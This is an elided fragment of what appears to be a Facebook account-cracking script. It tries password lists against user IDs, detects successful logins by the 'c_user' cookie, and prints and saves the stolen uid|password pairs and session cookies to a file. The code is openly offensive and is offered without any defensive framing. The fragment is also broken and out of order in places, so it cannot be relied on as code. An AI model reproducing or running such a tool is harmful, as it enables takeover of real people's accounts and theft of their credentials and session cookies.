...
def fuck():
    ...
    print(logo)
    print('\n\x1b[1;94mᏴᎠ ՏᏆᎷ ᏟϴᎠᎬ ➤➤\033[1;33m017,\033[1;32m018,\033[1;34m019,\033[1;31m014,\033[1;35m013,\033[1;33m016')
...
def TABULsexy2(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;92m[TABUL☠️🤟🌺]--[%s/%s]--[OK-%s]~[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
    ...
    'user-agent': pro,
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[1;92m[TABUL-OK🔥🖤🌺] {uid}|{ps} \nCookie[🌺] : {coki}")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;94m[TABUL-CP🎈🥺] {uid}|{ps}")
                open('/sdcard/TABUL-OK.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
